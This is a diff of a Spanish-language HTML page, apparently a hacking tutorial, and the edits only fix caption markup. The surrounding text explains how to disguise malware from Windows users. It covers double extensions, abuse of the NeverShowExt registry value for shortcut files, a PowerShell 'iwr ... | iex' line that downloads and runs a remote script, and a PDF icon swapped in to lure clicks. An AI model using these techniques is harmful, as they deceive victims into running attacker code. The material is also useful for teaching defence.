@@ -20,11 +20,11 @@
 <p>Muchos usuarios ignoran esta opción; para ser honestos, la mayoría de usuarios de Windows no la tienen activada, no les podría importar menos ver las extensiones de sus archivos.</p>
 <p>Esto crea una ruta bastante jugosa de ataque: nombrar tu <code>virus.exe</code> a <code>virus.jpg.exe</code>. El usuario verá la primera extensión <code>virus.jpg</code> y no podrá ver la verdadera extensión </p>
 <img src="images/Pasted image 20251113110512.png">
-calc.exe renombrado a calc.jpg.exe
+<p>calc.exe renombrado a calc.jpg.exe</p>
 
 <p>Aún así, hay usuarios que no son tan tontos. Y por algún motivo u otro tienen activada la opción de observar extensiones, estos usuarios van a atrapar muy facilmente el truco.</p>
 <img src="images/Pasted image 20251113110610.png">
-Ver extensiones habilitada
+<p>Ver extensiones habilitada</p>
 
 <p>Imagina la cara de la persona cuando vea que lo intentaste hacer pasar por tonto.</p>
 <p>Aún con esto activado, hay extensiones en windows que nunca son mostradas en la interfaz. Usaremos una de estas extensiones para explotar un sistema</p>
@@ -81,8 +81,8 @@ Valor <code>NeverShowExt</code> en la llave <code>lnkfile</code></p>
 
 <p><code>powershell.exe iwr http://192.168.1.187:8000/hello.ps1 | iex</code></p>
 <p>Usamos iwr (invoke-webrequest) para pedir el archivo hello.ps1 y redirigimos el contenido a iex (invoke-expression) para correr el codigo.</p>
-<p>Probemos si funciona:
-<img src="images/Pasted image 20251113115911.png"></p>
+<p>Probemos si funciona:</p>
+<img src="images/Pasted image 20251113115911.png">
 <p>Excelente! Pero hay un problema... El icóno de powershell es extremadamente sospechoso, ninguna persona clickeará en un &quot;Archivio Importante.pdf&quot; con un ícono así, necesitamos cambiarlo.</p>
 <p>Descargamos un icono .ico de pdf, y lo ponemos en la misma carpeta que el payload, y hacemos que apunte a él</p>
 <img src="images/Pasted image 20251113124006.png">
